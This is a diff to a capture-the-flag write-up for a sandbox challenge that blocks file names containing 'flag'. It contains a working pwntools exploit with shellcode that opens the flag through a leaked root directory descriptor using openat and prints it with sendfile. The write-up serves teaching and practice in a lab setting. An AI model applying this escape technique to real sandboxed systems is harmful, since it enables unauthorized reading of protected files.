@@ -58,7 +58,7 @@ int main(int argc, char **argv, char **envp)
     assert(chdir("/") == 0);
 
     int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "FLAG{FAKE}", 10);
+    write(fffd, "try harder", 10);
     close(fffd);
 
     void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
@@ -80,39 +80,59 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-= Bypassing flag-string check with openat
-
-== Introduction
-
-This level adds a check to prevent opening any file whose name contains the string "flag" before entering the jail. However, we can still open the root directory `/`.
-
 == Vulnerability Analysis
 
-The program checks `argv[1]` for the "flag" substring but allows us to open other paths.
+The challenge introduces a check to prevent users from opening any file containing the substring "flag".
 
 ```c
 assert(strstr(argv[1], "flag") == NULL);
 int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
 ```
 
-By passing `/` as `argv[1]`, we get a file descriptor pointing to the real root directory. The seccomp filter then restricts us to a few syscalls, including `openat`.
+While this prevents us from passing `/flag` directly, it does *not* prevent us from passing `/`. By passing the root directory, we still obtain a valid file descriptor (FD 3) that points to the host's root. The seccomp filter allows `openat`, which is all we need to traverse from that directory FD.
 
-== Exploitation Steps
+== Exploitation Plan
 
-=== 1. Leaking the Root FD
-Pass `/` as the first argument to the program. This opens the host's root directory and assigns it a file descriptor (usually 3).
+1.  **Leak the Root FD:** Execute the binary with `/` as the argument. The string check passes (since "/" doesn't contain "flag"), and we get a handle to the real root directory.
+2.  **Bypass Checks:** Use the `openat` syscall within our shellcode. We use the leaked FD (3) as the starting directory and `"flag"` as the relative path.
+3.  **Retrieve Flag:** Read the file content and write it to stdout using `sendfile`.
 
-=== 2. Using openat
-In the shellcode, use the `openat` syscall with the leaked file descriptor to open "flag".
+== Exploit Script
 
-```nasm
-/* openat(3, "flag", O_RDONLY) */
-mov rdi, 3
-lea rsi, [rip + flag_str]
-mov rdx, 0
-mov rax, 257 /* SYS_openat */
-syscall
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+# Pass '/' to bypass the string check and leak the root FD
+p = process([exe, "/"])
+
+shellcode = asm("""
+    /* openat(3, "flag", O_RDONLY) */
+    mov rdi, 3              /* dirfd: 3 */
+    lea rsi, [rip + flag]   /* pathname: "flag" */
+    xor rdx, rdx            /* flags: O_RDONLY */
+    mov rax, 257            /* syscall: SYS_openat */
+    syscall
+
+    /* sendfile(1, fd, 0, 100) */
+    mov rsi, rax            /* in_fd */
+    mov rdi, 1              /* out_fd */
+    xor rdx, rdx            /* offset */
+    mov r10, 100            /* count */
+    mov rax, 40             /* syscall: SYS_sendfile */
+    syscall
+
+    /* exit(0) */
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+flag:
+    .string "flag"
+""")
+
+p.send(shellcode)
+p.interactive()
 ```
-
-=== 3. Reading the Flag
-Use `sendfile` or `read`/`write` to output the contents of the opened flag file to stdout.
